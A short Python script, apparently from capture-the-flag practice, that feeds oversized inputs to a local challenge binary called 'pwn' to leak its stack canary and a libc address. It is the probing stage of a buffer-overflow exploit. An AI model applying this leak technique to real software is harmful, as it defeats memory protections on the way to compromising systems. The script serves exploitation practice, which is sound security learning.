import subprocess, time

BIN = ["./ld-linux-x86-64.so.2", "--library-path", ".", "./pwn"]

def run(size, payload, wait=1.0):
    p = subprocess.Popen(BIN, cwd="/run1", stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.stdin.write(str(size).encode() + b"\n"); p.stdin.flush()
    time.sleep(0.2)
    p.stdin.write(payload); p.stdin.flush()
    time.sleep(wait)
    try:
        p.stdin.close()
    except Exception:
        pass
    try:
        out = p.stdout.read()
    except Exception:
        out = b""
    p.wait()
    return out, p.returncode

def extract(out):
    k = b"Your name is: "
    i = out.find(k)
    if i < 0:
        return None
    return out[i + len(k):]

print("=== canary mode (0x59) ===")
for i in range(3):
    out, rc = run(0x59, b"A" * 0x59)
    leak = extract(out)
    print(i, "rc", rc, "leak", leak.hex() if leak else None)

print("=== libc mode (0x68) ===")
for i in range(3):
    out, rc = run(0x68, b"A" * 0x58 + b"B" * 8 + b"C" * 8)
    leak = extract(out)
    print(i, "rc", rc, "leak", leak.hex() if leak else None)
